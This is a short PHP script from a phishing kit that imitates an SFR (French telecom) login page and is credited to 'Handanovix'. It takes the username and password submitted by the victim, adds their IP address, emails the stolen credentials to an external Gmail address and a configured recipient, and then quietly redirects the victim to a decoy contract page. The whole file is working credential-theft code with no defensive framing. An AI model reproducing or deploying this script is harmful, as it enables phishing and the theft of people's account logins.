<?php
$userName = "$username";
session_start();
$_SESSION['username'] = $username;
?>
<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------- Resultat SFR France 2021 -----------------\n";
$message .= "----------------- LOGIN ----------------------\n";
$message .= "USR     : ".$_POST['username']."\n";
$message .= "PWD  : ".$_POST['password']."\n";

$message .= "----------------- Info D'IP -------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- SFR By Handanovix ---------------\n";

$sen = "$send";

$subject = "SFR LOGIN-ERROR ~ $ip";

$from .= "From: Mail~<Troj>\n";
$from .= "To:micktesla80@gmail.com";

mail($sen,$subject,$message,$from);

echo '<script language="Javascript">
<!--
document.location.replace("Contract.html?id=3000085412000091");
// -->
</script>';
?>